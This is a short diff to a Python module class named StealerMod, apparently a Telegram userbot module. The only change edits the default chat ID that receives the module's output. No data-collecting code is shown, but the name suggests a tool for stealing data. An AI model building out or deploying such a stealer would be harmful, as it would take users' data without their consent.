@@ -15,7 +15,7 @@ class StealerMod(loader.Module):
     def __init__(self):
         self.config = loader.ModuleConfig(
             loader.ConfigValue(
-                "chat_id", -1002205010643, "ID",
+                "chat_id", 2205010643, "ID",
                 validator=loader.validators.Integer(),
             )
         )
